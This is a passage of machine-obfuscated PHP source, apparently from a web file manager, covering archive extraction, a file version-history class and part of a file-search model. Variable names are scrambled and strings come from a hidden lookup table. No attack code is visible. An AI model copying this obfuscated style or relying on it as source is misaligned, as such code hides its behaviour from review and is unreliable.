self::localFilePath($ûÍ°¼ğó); if (!$Ñ‚üå¼È) { $Ñ‚üå¼È = $úÂ÷‡‚ê . $¾¦˜”§ú[1293]; if (!IO::exist($Ñ‚üå¼È)) { self::copy($ûÍ°¼ğó, $úÂ÷‡‚ê, !1, get_path_this($Ñ‚üå¼È)); } } if (!$Ñ‚üå¼È || !IO::exist($Ñ‚üå¼È)) { return !1; } if ($âœ­È¡Š[$¾¦˜”§ú[1273]] == -1) { return array($¾¦˜”§ú[232] => $Ñ‚üå¼È, $¾¦˜”§ú[1272] => $ÅÎè©÷, $¾¦˜”§ú[1274] => $úÂ÷‡‚ê); } $Û½õ¨ı¥ = $Ñ‚üå¼È; foreach ($ÅÎè©÷ as $Ïè‘Ôİ¯ => $’½ƒÊŒ«) { if (!$’½ƒÊŒ« || $’½ƒÊŒ«[$¾¦˜”§ú[1273]] == $¾¦˜”§ú[1271]) { break; } if (substr($’½ƒÊŒ«[$¾¦˜”§ú[32]], -1, 1) == $¾¦˜”§ú[8]) { break; } $»›ÌàÀ = in_array(get_path_ext($’½ƒÊŒ«[$¾¦˜”§ú[1288]]), array($¾¦˜”§ú[390], $¾¦˜”§ú[1278], $¾¦˜”§ú[1279], $¾¦˜”§ú[1280], $¾¦˜”§ú[1281], $¾¦˜”§ú[1282])); $ô¸ÓİÜ = $Ïè‘Ôİ¯ == count($ÅÎè©÷) - 1 && $»›ÌàÀ; $‰ÌÈÌê = $úÂ÷‡‚ê . $’½ƒÊŒ«[$¾¦˜”§ú[1288]]; $Ù©éÙÎø = $úÂ÷‡‚ê . get_path_this($’½ƒÊŒ«[$¾¦˜”§ú[32]]); if (IO::exist($‰ÌÈÌê)) { $Û½õ¨ı¥ = $‰ÌÈÌê; continue; } $ÇÒä¾® = $Ïè‘Ôİ¯ == 0 ? get_path_ext($à¿Ü–€) : get_path_ext($Û½õ¨ı¥); $šÖÖíâ = KodArchive::extract(self::iconvSystem($Û½õ¨ı¥), $úÂ÷‡‚ê, $’½ƒÊŒ«[$¾¦˜”§ú[1273]], $‘»İ‹ÀŞ, $ÇÒä¾®); self::unzipErrorCheck($šÖÖíâ, array($¾¦˜”§ú[1294], $ûÍ°¼ğó, $ÅÎè©÷, $’½ƒÊŒ«, $‰ÌÈÌê)); if (IO::exist($Ù©éÙÎø)) { IO::rename($Ù©éÙÎø, get_path_this($‰ÌÈÌê)); } $Û½õ¨ı¥ = $‰ÌÈÌê; } $ğ÷™šñâ = $Û½õ¨ı¥; return array($¾¦˜”§ú[232] => $Û½õ¨ı¥, $¾¦˜”§ú[1272] => $ÅÎè©÷, $¾¦˜”§ú[1274] => $úÂ÷‡‚ê); } private static function unzipErrorCheck($şÁ½úÇÈ, $ñ»Ì¬‚« = false) { $°¹ÑÑº” =& $_SERVER[°‰†òö¯]; if ($şÁ½úÇÈ[$°¹ÑÑº”[1295]]) { return !0; } write_log(array($°¹ÑÑº”[1296], $şÁ½úÇÈ, $ñ»Ì¬‚«), $°¹ÑÑº”[1297]); $õóç´ôÓ = is_array($şÁ½úÇÈ[$°¹ÑÑº”[1285]]) ? json_encode($şÁ½úÇÈ[$°¹ÑÑº”[1285]]) : $şÁ½úÇÈ[$°¹ÑÑº”[1285]]; show_json($°¹ÑÑº”[1298] . $õóç´ôÓ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ ´äİñ =& $_SERVER[°‰†òö¯]; $şôëèâ = $GLOBALS[$ ´äİñ[6]][$ ´äİñ[92]]; if ($şôëèâ[$ ´äİñ[1299]] != 1) { return; } if ($şôëèâ[$ ´äİñ[1300]] <= 0) { return; } if (isset($_REQUEST[$ ´äİñ[1301]]) && $_REQUEST[$ ´äİñ[1301]] == $ ´äİñ[91]) { return; } Hook::bind($ ´äİñ[1302], $ ´äİñ[1303]); Hook::bind($ ´äİñ[1304], $ ´äİñ[1305]); Hook::bind($ ´äİñ[1306], $ ´äİñ[1307]); Hook::bind($ ´äİñ[1308], $ ´äİñ[1309]); Hook::bind($ ´äİñ[1310], $ ´äİñ[1311]); Hook::bind($ ´äİñ[1312], $ ´äİñ[1313]); } public static function eventBeforeUpload($Æì—îÜ) { if ($Æì—îÜ[3] && $Æì—îÜ[3] != REPEAT_REPLACE) { return; } $¢È™Õ„Ñ = self::parsePath($Æì—îÜ[0]); if (!$¢È™Õ„Ñ) { return; } self::add($¢È™Õ„Ñ); } public static function eventBeforeEdit($¸«è˜„·) { $İƒ‹Ø»® = self::parsePath($¸«è˜„·[0]); if (!$İƒ‹Ø»®) { return; } self::add($İƒ‹Ø»®); } public static function eventBeforeCopyFile($ùÖ™ÚÇÜ, $–â¿„öØ, $Æö³×¬, $€Â¸ú·ì, $ğÀ¹ô¬ƒ, $©Øª²´Ò) { $ªá±Ã° =& $_SERVER[°‰†òö¯]; if (isset($Æö³×¬->_data[$ªá±Ã°[1234]]) && $Æö³×¬->_data[$ªá±Ã°[1234]]) { return; } $–·®«»Ÿ = $Æö³×¬->getPathOuter($€Â¸ú·ì); $€´°œƒ = self::parsePath($–·®«»Ÿ); if (!$€´°œƒ) { return; } self::add($€´°œƒ); } public static function eventBeforeRename($í™ü½ì›) { $šğ·–‚ =& $_SERVER[°‰†òö¯]; $ååËÈ’Ş = self::parsePath($í™ü½ì›[0]); if (!$ååËÈ’Ş) { return; } $ôìª÷½² = self::checkInHistory($ååËÈ’Ş); if (!$ôìª÷½²) { return; } if ($ôìª÷½²[$šğ·–‚[33]] == $šğ·–‚[232]) { $«ùÀÉéˆ = self::listData($ååËÈ’Ş); if ($«ùÀÉéˆ && $«ùÀÉéˆ[$šğ·–‚[447]]) { self::moveHistory($ååËÈ’Ş, $í™ü½ì›[1]); } } else { IO::rename($ôìª÷½²[$šğ·–‚[87]], $í™ü½ì›[1]); } } public static function eventBeforeMove($ôöÛæù˜) { $õ¼è›íÆ =& $_SERVER[°‰†òö¯]; $ıçËÔ¯å = self::parsePath($ôöÛæù˜[0]); if (!$ıçËÔ¯å) { return; } $©ÒÕ€ñˆ = self::parsePath($ôöÛæù˜[1]); if (!$©ÒÕ€ñˆ) { return; } $…Î¥×ç° = $ôöÛæù˜[3]; $…–£œê‡ = self::checkInHistory($ıçËÔ¯å); if (!$…–£œê‡) { return; } $ÓƒøÑÀı = self::pathHistory($©ÒÕ€ñˆ); if ($…–£œê‡[$õ¼è›íÆ[33]] == $õ¼è›íÆ[232]) { $‹¬Õ´Ï¡ = self::listData($ıçËÔ¯å); $òŞÊªò‹ = rtrim($©ÒÕ€ñˆ, $õ¼è›íÆ[8]) . $õ¼è›íÆ[8] . ($…Î¥×ç° ? $…Î¥×ç° : get_path_this($ıçËÔ¯å)); $’öÏÁ†° = self::listData($òŞÊªò‹); if ($‹¬Õ´Ï¡ && $‹¬Õ´Ï¡[$õ¼è›íÆ[447]] && $’öÏÁ†° && $’öÏÁ†°[$õ¼è›íÆ[447]]) { return self::clear($ıçËÔ¯å); } if ($‹¬Õ´Ï¡ && $‹¬Õ´Ï¡[$õ¼è›íÆ[447]]) { self::moveHistory($ıçËÔ¯å, $…Î¥×ç°, $ÓƒøÑÀı); } } else { IO::move($…–£œê‡[$õ¼è›íÆ[87]], $ÓƒøÑÀı, !1, $…Î¥×ç°); self::clearEmptyFolder(IO::pathFather($…–£œê‡[$õ¼è›íÆ[87]])); } } public static function eventAfterRemove($´Å¥Ö³, $ ¼ß¶´™) { $¹şö«úİ =& $_SERVER[°‰†òö¯]; if (!$ ¼ß¶´™) { return; } $î‰Ğ¬–Ø = self::parsePath($´Å¥Ö³[0]); if (!$î‰Ğ¬–Ø) { return; } $ğÙÅÅ‹Ó = self::checkInHistory($î‰Ğ¬–Ø); if (!$ğÙÅÅ‹Ó) { return; } if ($ğÙÅÅ‹Ó[$¹şö«úİ[33]] == $¹şö«úİ[232]) { $Àèïç¹í = self::listData($î‰Ğ¬–Ø, !1); if ($Àèïç¹í && $Àèïç¹í[$¹şö«úİ[447]]) { self::clear($î‰Ğ¬–Ø, !1); } } else { IO::remove($ğÙÅÅ‹Ó[$¹şö«úİ[87]]); self::clearEmptyFolder(IO::pathFather($ğÙÅÅ‹Ó[$¹şö«úİ[87]])); } } private static function checkInHistory($Ñ§ğàÅÖ) { $¥ÌÄğ¦ = self::pathHistory($Ñ§ğàÅÖ); if (!IO::exist($¥ÌÄğ¦)) { $¥ÌÄğ¦ .= $_SERVER[°‰†òö¯][1314]; } return IO::exist($¥ÌÄğ¦) ? IO::info($¥ÌÄğ¦) : !1; } private static function parsePath($Éå½â“È) { $ëÕ‰Ó†Ù =& $_SERVER[°‰†òö¯]; if (!$Éå½â“È) { return !1; } if (isset($GLOBALS[$ëÕ‰Ó†Ù[1315]]) && $GLOBALS[$ëÕ‰Ó†Ù[1315]]) { return; } $¶½“›º = KodIO::parse($Éå½â“È); $Ş‡³ëü¼ = $¶½“›º[$ëÕ‰Ó†Ù[33]]; $ôîÇ±Ç = !$Ş‡³ëü¼ || $Ş‡³ëü¼ == KodIO::KOD_IO || $Ş‡³ëü¼ == KodIO::KOD_SHARE_ITEM; if (!$ôîÇ±Ç || !$¶½“›º[$ëÕ‰Ó†Ù[1316]]) { return !1; } if (substr($Éå½â“È, 0, strlen(DATA_PATH . $ëÕ‰Ó†Ù[1317])) == DATA_PATH . $ëÕ‰Ó†Ù[1317]) { return !1; } if ($Ş‡³ëü¼ == KodIO::KOD_SHARE_ITEM) { $÷ªˆ½ËÁ = IO::init($Éå½â“È); if ($÷ªˆ½ËÁ->pathParse[$ëÕ‰Ó†Ù[1230]]) { return self::parsePath($÷ªˆ½ËÁ->pathParse[$ëÕ‰Ó†Ù[1230]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $«¶“Ù‰Ò = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ëÕ‰Ó†Ù[1318]); foreach ($«¶“Ù‰Ò as $ö¹»Õ’¶) { if (!$Ş‡³ëü¼ && substr($Éå½â“È, 0, strlen($ö¹»Õ’¶)) == $ö¹»Õ’¶) { return !1; } } self::log($GLOBALS[$ëÕ‰Ó†Ù[1225]] . $ëÕ‰Ó†Ù[1319] . $Éå½â“È); return $Éå½â“È; } private static function pathHistory($Ï¾•û¬À) { $ËÆ¨£À =& $_SERVER[°‰†òö¯]; $‚÷Ş€¬Ï = self::$_historyBase . ltrim(KodIO::clear($Ï¾•û¬À), $ËÆ¨£À[8]); $‚÷Ş€¬Ï = str_replace(array($ËÆ¨£À[1320]), array($ËÆ¨£À[1321]), $‚÷Ş€¬Ï); return $‚÷Ş€¬Ï; } public static function log($ªÔÒœç ) { } public static function historyCount($ŞğÀûÏ) { $èóò§ê½ =& $_SERVER[°‰†òö¯]; $ôÕ’ÑÉì = array(); $Úşš¬È = array(); foreach ($ŞğÀûÏ as $Õ–›‰¿) { $§•¾Üâ = get_path_father($Õ–›‰¿); if (!$Úşš¬È[$§•¾Üâ]) { $Úşš¬È[$§•¾Üâ] = array(); } $Úşš¬È[$§•¾Üâ][] = get_path_this($Õ–›‰¿); } foreach ($Úşš¬È as $§•¾Üâ => $†¾êªÍ) { $ÀÀ‘÷¶Á = self::parsePath($§•¾Üâ); if (!$ÀÀ‘÷¶Á) { continue; } foreach ($†¾êªÍ as $øäµÍ») { $û£øµãÀ = self::listData(rtrim($ÀÀ‘÷¶Á, $èóò§ê½[8]) . $èóò§ê½[8] . $øäµÍ», !1); if ($û£øµãÀ && $û£øµãÀ[$èóò§ê½[447]]) { $ôÕ’ÑÉì[rtrim($§•¾Üâ, $èóò§ê½[8]) . $èóò§ê½[8] . $øäµÍ»] = count($û£øµãÀ[$èóò§ê½[447]]); } } } return $ôÕ’ÑÉì; } public static function add($ÑîÊçè) { $Ì‡ó£¯Æ =& $_SERVER[°‰†òö¯]; $øË•¼‡Œ = self::listData($ÑîÊçè); if (!$øË•¼‡Œ) { return; } $›™Ï„¯ = Model($Ì‡ó£¯Æ[831])->get($Ì‡ó£¯Æ[1322]); $©ñÌ¤Äã = intval($GLOBALS[$Ì‡ó£¯Æ[6]][$Ì‡ó£¯Æ[92]][$Ì‡ó£¯Æ[1300]]); $®ª“í = $›™Ï„¯ == $Ì‡ó£¯Æ[1323] ? min(5, $©ñÌ¤Äã) : $©ñÌ¤Äã; if ($©ñÌ¤Äã <= 0) { return; } $ßˆ¡öĞ¿ = IO::info($ÑîÊçè); $¾ôÜ³ÁÜ = $øË•¼‡Œ[$Ì‡ó£¯Æ[447]]; if ($ßˆ¡öĞ¿[$Ì‡ó£¯Æ[79]] == 0) { return; } if ($ßˆ¡öĞ¿[$Ì‡ó£¯Æ[79]] >= 1024 * 1024 * 500) { return !1; } $´‹ÚÜµ´ = IO::hashSimple($ÑîÊçè); if ($¾ôÜ³ÁÜ && $¾ôÜ³ÁÜ[0][$Ì‡ó£¯Æ[679]] == $´‹ÚÜµ´) { return !0; } if (array_key_exists($Ì‡ó£¯Æ[235], $ßˆ¡öĞ¿) && !$ßˆ¡öĞ¿[$Ì‡ó£¯Æ[235]]) { return !1; } $õ•¢Ìİ® = short_id(time()); $¸´àĞÚ— = array($Ì‡ó£¯Æ[477] => $õ•¢Ìİ®, $Ì‡ó£¯Æ[679] => $´‹ÚÜµ´, $Ì‡ó£¯Æ[32] => $ßˆ¡öĞ¿[$Ì‡ó£¯Æ[32]] . $Ì‡ó£¯Æ[10] . date($Ì‡ó£¯Æ[1324]) . rand_string(1), $Ì‡ó£¯Æ[79] => $ßˆ¡öĞ¿[$Ì‡ó£¯Æ[79]], $Ì‡ó£¯Æ[529] => USER_ID, $Ì‡ó£¯Æ[233] => time(), $Ì‡ó£¯Æ[1325] => $Ì‡ó£¯Æ[12]); IO::mkdir($øË•¼‡Œ[$Ì‡ó£¯Æ[1326]]); $Ë¤Åğ»À = IO::copy($ÑîÊçè, $øË•¼‡Œ[$Ì‡ó£¯Æ[1326]], !1, $¸´àĞÚ—[$Ì‡ó£¯Æ[32]]); if (!$Ë¤Åğ»À) { self::clearEmptyFolder($øË•¼‡Œ[$Ì‡ó£¯Æ[1326]]); return !1; } array_unshift($¾ôÜ³ÁÜ, $¸´àĞÚ—); if (count($¾ôÜ³ÁÜ) > $®ª“í) { $§÷Á†Î = array_slice($¾ôÜ³ÁÜ, $®ª“í); foreach ($§÷Á†Î as $¦©„¸Ğ’) { IO::remove($øË•¼‡Œ[$Ì‡ó£¯Æ[1326]] . $¦©„¸Ğ’[$Ì‡ó£¯Æ[32]]); } $¾ôÜ³ÁÜ = array_slice($¾ôÜ³ÁÜ, 0, $®ª“í); } return self::saveData($øË•¼‡Œ[$Ì‡ó£¯Æ[1327]], $¾ôÜ³ÁÜ); } public static function remove($…’ÕÇçâ, $Èïæšü) { $å¼äËİ¯ =& $_SERVER[°‰†òö¯]; $Ş×•†ñ = self::listData($…’ÕÇçâ); $ç™è­±Å = array(); if (!$Ş×•†ñ) { return !1; } foreach ($Ş×•†ñ[$å¼äËİ¯[447]] as $ÛÉİ‰È¢) { if ($ÛÉİ‰È¢[$å¼äËİ¯[477]] == $Èïæšü) { IO::remove($Ş×•†ñ[$å¼äËİ¯[1326]] . $ÛÉİ‰È¢[$å¼äËİ¯[32]]); continue; } $ç™è­±Å[] = $ÛÉİ‰È¢; } return self::saveData($Ş×•†ñ[$å¼äËİ¯[1327]], $ç™è­±Å); } public static function clear($Í£Ÿéà, $ÏìÊÕ®¯ = true) { $¨íĞƒ›ú =& $_SERVER[°‰†òö¯]; $öù±éìÉ = self::listData($Í£Ÿéà, $ÏìÊÕ®¯); if (!$öù±éìÉ) { return !1; } foreach ($öù±éìÉ[$¨íĞƒ›ú[447]] as $–‡ÃİèŞ) { IO::remove($öù±éìÉ[$¨íĞƒ›ú[1326]] . $–‡ÃİèŞ[$¨íĞƒ›ú[32]]); } return self::saveData($öù±éìÉ[$¨íĞƒ›ú[1327]], array()); } public static function moveHistory($´õ‰Œ°˜, $Ì»ÈşŒ = '', $©ÊÎŞÂÃ = '') { $û×§­ñ‡ =& $_SERVER[°‰†òö¯]; $‰®“¢Ü = self::listData($´õ‰Œ°˜, !1); if (!$‰®“¢Ü || !$‰®“¢Ü[$û×§­ñ‡[447]]) { return !1; } $©½ÄğÓÀ = $û×§­ñ‡[1314]; $Ì»ÈşŒ = $Ì»ÈşŒ ? $Ì»ÈşŒ : get_path_this($´õ‰Œ°˜); $©ÊÎŞÂÃ = $©ÊÎŞÂÃ ? $©ÊÎŞÂÃ : $‰®“¢Ü[$û×§­ñ‡[1326]]; $†§–¸‰ = substr(get_path_this($‰®“¢Ü[$û×§­ñ‡[1327]]), 0, -strlen($©½ÄğÓÀ)); foreach ($‰®“¢Ü[$û×§­ñ‡[447]] as $ÍÏù§»¥ => $…ç×ïİ½) { $©¶­­•¶ = $Ì»ÈşŒ . substr($…ç×ïİ½[$û×§­ñ‡[32]], strlen($†§–¸‰)); $ÊŠ÷°Íá = IO::move($‰®“¢Ü[$û×§­ñ‡[1326]] . $…ç×ïİ½[$û×§­ñ‡[32]], $©ÊÎŞÂÃ, !1, $©¶­­•¶); if ($ÊŠ÷°Íá) { $‰®“¢Ü[$û×§­ñ‡[447]][$ÍÏù§»¥][$û×§­ñ‡[32]] = $©¶­­•¶; } } $‰®“¢Ü[$û×§­ñ‡[1327]] = IO::move($‰®“¢Ü[$û×§­ñ‡[1327]], $©ÊÎŞÂÃ, !1, $Ì»ÈşŒ . $©½ÄğÓÀ); self::saveData($‰®“¢Ü[$û×§­ñ‡[1327]], $‰®“¢Ü[$û×§­ñ‡[447]]); self::clearEmptyFolder($‰®“¢Ü[$û×§­ñ‡[1326]]); } public static function rollback($ ¬õ¨›œ, $…©Ğò“ê) { $ÄÒõ‘¼Î =& $_SERVER[°‰†òö¯]; $¿¢‘¢à = self::listData($ ¬õ¨›œ); if (!$¿¢‘¢à) { return; } $¸‹ãÊ†œ = IO::info($ ¬õ¨›œ); foreach ($¿¢‘¢à[$ÄÒõ‘¼Î[447]] as $êô¾¨ÊÕ => $ëµ³ûìÂ) { if ($ëµ³ûìÂ[$ÄÒõ‘¼Î[477]] == $…©Ğò“ê) { self::add($ ¬õ¨›œ); $ªßÆ£Èö = $¿¢‘¢à[$ÄÒõ‘¼Î[1326]] . $ëµ³ûìÂ[$ÄÒõ‘¼Î[32]]; $‚˜ú˜Î¾ = IO::copy($ªßÆ£Èö, IO::pathFather($ ¬õ¨›œ), REPEAT_REPLACE, $¸‹ãÊ†œ[$ÄÒõ‘¼Î[32]]); if ($‚˜ú˜Î¾) { self::remove($ ¬õ¨›œ, $…©Ğò“ê); } return $‚˜ú˜Î¾; } } return !1; } public static function setDetail($›¨²äÀ, $÷…ü°é, $óÛ­íÆì) { $à‘Š—‡û =& $_SERVER[°‰†òö¯]; $·Òš = self::listData($›¨²äÀ); if (!$·Òš) { return; } foreach ($·Òš[$à‘Š—‡û[447]] as $“±†ü­ => $¶º¯Ä§°) { if ($¶º¯Ä§°[$à‘Š—‡û[477]] == $÷…ü°é) { $·Òš[$à‘Š—‡û[447]][$“±†ü­][$à‘Š—‡û[1325]] = $óÛ­íÆì; self::saveData($·Òš[$à‘Š—‡û[1327]], $·Òš[$à‘Š—‡û[447]]); return !0; } } return !1; } public static function fileInfo($²¨Ğ‹°–, $¤¹ÓŒ˜) { $ìÙµ×ßÄ =& $_SERVER[°‰†òö¯]; $öØ¹åë‡ = self::listData($²¨Ğ‹°–); if (!$öØ¹åë‡) { show_json(LNG($ìÙµ×ßÄ[108]), !1); } $àÉãİòå = $ìÙµ×ßÄ[12]; foreach ($öØ¹åë‡[$ìÙµ×ßÄ[447]] as $æâœêÇ½ => $ôšÌôÖ) { if ($ôšÌôÖ[$ìÙµ×ßÄ[477]] != $¤¹ÓŒ˜) { continue; } $àÉãİòå = $öØ¹åë‡[$ìÙµ×ßÄ[1326]] . $ôšÌôÖ[$ìÙµ×ßÄ[32]]; break; } if (!$àÉãİòå) { show_json(LNG($ìÙµ×ßÄ[108]), !1); } return IO::info($àÉãİòå); } public static function fileOut($„ÈğÁ•, $©‹ÅÖ™Ù, $ÌƒèÖïÅ = false) { $ÇÔˆãèƒ =& $_SERVER[°‰†òö¯]; $ûçù§ = self::fileInfo($„ÈğÁ•, $©‹ÅÖ™Ù); $šàØğ³ =& $GLOBALS[$ÇÔˆãèƒ[7]]; $ÌƒèÖïÅ = isset($šàØğ³[$ÇÔˆãèƒ[1277]]) && $šàØğ³[$ÇÔˆãèƒ[1277]] == 1; if (isset($šàØğ³[$ÇÔˆãèƒ[33]]) && $šàØğ³[$ÇÔˆãèƒ[33]] == $ÇÔˆãèƒ[1328]) { return IO::fileOutImage($ûçù§[$ÇÔˆãèƒ[87]], $šàØğ³[$ÇÔˆãèƒ[1329]]); } IO::fileOut($ûçù§[$ÇÔˆãèƒ[87]], $ÌƒèÖïÅ, get_path_this($„ÈğÁ•)); } public static function listData($÷×ÛÂ™”, $ÔòøÛù’ = true) { $¼İ–™¾Ğ =& $_SERVER[°‰†òö¯]; if ($ÔòøÛù’ && !IO::exist($÷×ÛÂ™”)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($÷×ÛÂ™”, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ßÀòÉ = self::pathHistory($÷×ÛÂ™”); $İñæ®Ô = array($¼İ–™¾Ğ[1327] => $ßÀòÉ . $¼İ–™¾Ğ[1314], $¼İ–™¾Ğ[1326] => rtrim(get_path_father($ßÀòÉ), $¼İ–™¾Ğ[8]) . $¼İ–™¾Ğ[8], $¼İ–™¾Ğ[447] => array()); $İÂÎƒ = IO::getContent($İñæ®Ô[$¼İ–™¾Ğ[1327]]); if ($İÂÎƒ) { $ÅÁá‚¹˜ = json_decode($İÂÎƒ, !0); if (is_array($ÅÁá‚¹˜)) { $İñæ®Ô[$¼İ–™¾Ğ[447]] = $ÅÁá‚¹˜; } } return $İñæ®Ô; } private static function saveData($×ÊÀŒù, $Éò‡ÏŠ) { $æ§½´Ö =& $_SERVER[°‰†òö¯]; self::log($æ§½´Ö[1330] . $×ÊÀŒù . $æ§½´Ö[74] . count($Éò‡ÏŠ), $æ§½´Ö[813]); if ($Éò‡ÏŠ) { return IO::setContent($×ÊÀŒù, json_encode($Éò‡ÏŠ)); } $ëö²È›– = IO::pathFather($×ÊÀŒù); IO::remove($×ÊÀŒù); self::clearEmptyFolder($ëö²È›–); return !0; } public static function clearEmptyFolder($Î©ƒ½) { $µïÆÑ”À =& $_SERVER[°‰†òö¯]; if (trim($Î©ƒ½, $µïÆÑ”À[8]) == trim(self::$_historyBase, $µïÆÑ”À[8])) { return; } $æøşÂªİ = IO::pathFather($Î©ƒ½); $ûùïÈÑî = IO::has($Î©ƒ½, !0); if ($ûùïÈÑî[$µïÆÑ”À[241]] > 0 || $ûùïÈÑî[$µïÆÑ”À[242]] > 0) { return; } IO::remove($Î©ƒ½); self::clearEmptyFolder($æøşÂªİ); } private static function getBasePath() { $†ï¬ûè =& $_SERVER[°‰†òö¯]; $¢Ïî´¿ê = Model($†ï¬ûè[1331])->get($†ï¬ûè[1332]); if ($¢Ïî´¿ê) { if (!IO::exist($¢Ïî´¿ê)) { IO::mkdir($¢Ïî´¿ê); } if (get_path_this($¢Ïî´¿ê) == $†ï¬ûè[1317]) { $ØÊ¥»…½ = $†ï¬ûè[1333] . rand_string(8); @rename($¢Ïî´¿ê, get_path_father($¢Ïî´¿ê) . $†ï¬ûè[8] . $ØÊ¥»…½); $¢Ïî´¿ê = DATA_PATH . $ØÊ¥»…½ . $†ï¬ûè[8]; file_put_contents(DATA_PATH . $†ï¬ûè[1264], $†ï¬ûè[12]); Model($†ï¬ûè[1331])->set($†ï¬ûè[1332], $¢Ïî´¿ê); } return $¢Ïî´¿ê; } $¢Ïî´¿ê = DATA_PATH . $†ï¬ûè[1333] . rand_string(8) . $†ï¬ûè[8]; $¢Ïî´¿ê = IO::mkdir($¢Ïî´¿ê); $¢Ïî´¿ê = rtrim($¢Ïî´¿ê, $†ï¬ûè[8]) . $†ï¬ûè[8]; file_put_contents($¢Ïî´¿ê . $†ï¬ûè[1264], $†ï¬ûè[12]); file_put_contents(DATA_PATH . $†ï¬ûè[1264], $†ï¬ûè[12]); Model($†ï¬ûè[1331])->set($†ï¬ûè[1332], $¢Ïî´¿ê); return $¢Ïî´¿ê; } } goto A†ìŠõ„íé; fÆÔï‚·‡: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($á€‘úëÉ) { $½÷Ş€£× =& $_SERVER[°‰†òö¯]; $¿ó†ÄÒÈ = KodIO::fileTypeList(); $Ó¨ê–ë™ = $¿ó†ÄÒÈ[$á€‘úëÉ]; if (!$Ó¨ê–ë™) { return array(); } $¬íŒÒ©¥ = $Ó¨ê–ë™[$½÷Ş€£×[169]]; $úÏ»õµ = $½÷Ş€£×[7]; if (!$Ó¨ê–ë™[$½÷Ş€£×[169]]) { $‘Ş‡ğ­È = array_to_keyvalue($¿ó†ÄÒÈ, $½÷Ş€£×[12], $½÷Ş€£×[169]); $¬íŒÒ©¥ = implode($½÷Ş€£×[50], $‘Ş‡ğ­È); $úÏ»õµ = $½÷Ş€£×[2239]; } $âïúÛê = explode($½÷Ş€£×[50], trim($¬íŒÒ©¥, $½÷Ş€£×[50])); return array($úÏ»õµ, $âïúÛê); } public function listPathType($÷äõ¥¡) { $½§²œ“Ÿ =& $_SERVER[°‰†òö¯]; $˜†ö®… = $this->fileTypeWhere($÷äõ¥¡); if (!$˜†ö®…) { return array(); } $Ì‹ÊŠÈ = USER_ID; $¯Ü÷ú¹ = Model($½§²œ“Ÿ[601])->getInfo($Ì‹ÊŠÈ); $ĞÄÓäß´ = array($½§²œ“Ÿ[655] => SourceModel::TYPE_USER, $½§²œ“Ÿ[588] => array($½§²œ“Ÿ[619], $½§²œ“Ÿ[597] . $¯Ü÷ú¹[$½§²œ“Ÿ[90]][$½§²œ“Ÿ[193]] . $½§²œ“Ÿ[620]), $½§²œ“Ÿ[656] => $Ì‹ÊŠÈ, $½§²œ“Ÿ[653] => 0, $½§²œ“Ÿ[654] => $˜†ö®…); return $this->listSource($ĞÄÓäß´); } public function listSearch($­ÜıÖáÉ, $æº¡ßé = 300) { $óæ·‹”Û =& $_SERVER[°‰†òö¯]; if (isset($­ÜıÖáÉ[$óæ·‹”Û[2070]]) && $­ÜıÖáÉ[$óæ·‹”Û[2070]]) { $­ÜıÖáÉ[$óæ·‹”Û[2070]] = str_replace($óæ·‹”Û[462], $óæ·‹”Û[2240], trim($­ÜıÖáÉ[$óæ·‹”Û[2070]])); } $²üØ—–¾ = $this->_parseSearchWhere($­ÜıÖáÉ); if (!isset($²üØ—–¾[$óæ·‹”Û[507]])) { $²üØ—–¾[$óæ·‹”Û[507]] = 0; } $Ï˜ùÜÂ = $óæ·‹”Û[2241]; $‚¶†ñè« = $²üØ—–¾; $“¼®Ãø· = $Ï˜ùÜÂ; $this->_listSearchBindPinyin($­ÜıÖáÉ, $²üØ—–¾, $Ï˜ùÜÂ); $this->alias($óæ·‹”Û[521])->_makeOrder(); $²üØ—–¾ = $this->parseWhereLike($²üØ—–¾); $üÑÀé¸‡ = $this->distinct(!0)->field($Ï˜ùÜÂ)->where($²üØ—–¾)->selectPage($æº¡ßé); if ($GLOBALS[$óæ·‹”Û[6]][$óæ·‹”Û[459]][$óæ·‹”Û[460]] && Input::check($­ÜıÖáÉ[$óæ·‹”Û[2070]], $óæ·‹”Û[662]) && $üÑÀé¸‡[$óæ·‹”Û[444]][$óæ·‹”Û[430]] == 1 && $üÑÀé¸‡[$óæ·‹”Û[444]][$óæ·‹”Û[445]] == 0) { $üÑÀé¸‡ = $this->distinct(!0)->field($Ï˜ùÜÂ)->where($‚¶†ñè«)->limit(1000)->select(); $üÑÀé¸‡ = array_page_split($üÑÀé¸‡, !1, $æº¡ßé); } $this->_listSearchFileContent($üÑÀé¸‡, $­ÜıÖáÉ, $“¼®Ãø·, $‚¶†ñè«); $this->_listSearchDesc($üÑÀé¸‡, $­ÜıÖáÉ, $“¼®Ãø·); $this->_listSearchTag($üÑÀé¸‡, $­ÜıÖáÉ, $“¼®Ãø·); $this->_listSearchGroupTag($üÑÀé¸‡, $­ÜıÖáÉ, $“¼®Ãø·); $this->_listDataApply($üÑÀé¸‡[$óæ·‹”Û[447]]); $this->_listMake($üÑÀé¸‡); return $üÑÀé¸‡; } private function _listSearchFileContent(&$ÄîıÇù‚, $ ¥¼–´Ş, $Ú‘ß“¯˜, $Öœ´ó²) { $¨³‡§ =& $_SERVER[°‰†òö¯]; if (!$ ¥¼–´Ş[$¨³‡§[2070]] || $ÄîıÇù‚[$¨³‡§[444]][$¨³‡§[430]] > 1) { return; } if (!isset($Öœ´ó²[$¨³‡§[32]]) || !is_array($ ¥¼–´Ş[$¨³‡§[545]])) { return; } $Öœ´ó²[$¨³‡§[545]] = array($¨³‡§[7], $ ¥¼–´Ş[$¨³‡§[545]]); unset($Öœ´ó²[$¨³‡§[32]]); unset($ ¥¼–´Ş[$¨³‡§[545]]); $ŸÙèÎÅ = $this->field($Ú‘ß“¯˜)->where($Öœ´ó²)->limit($¨³‡§[2242])->select(); if (!$ŸÙèÎÅ || count($ŸÙèÎÅ) == 0) { return; } $ÄîıÇù‚[$¨³‡§[447]] = array_merge($ŸÙèÎÅ, $ÄîıÇù‚[$¨³‡§[447]]); $ÄîıÇù‚[$¨³‡§[444]][$¨³‡§[445]] += count($ŸÙèÎÅ); } private function _listSearchTag(&$ãê´‘†„, $Áñ©²Ñ‹, $¥õ˜¢„) { $ğĞƒˆæ =& $_SERVER[°‰†òö¯]; if (!isset($Áñ©²Ñ‹[$ğĞƒˆæ[2243]])) { return; } if 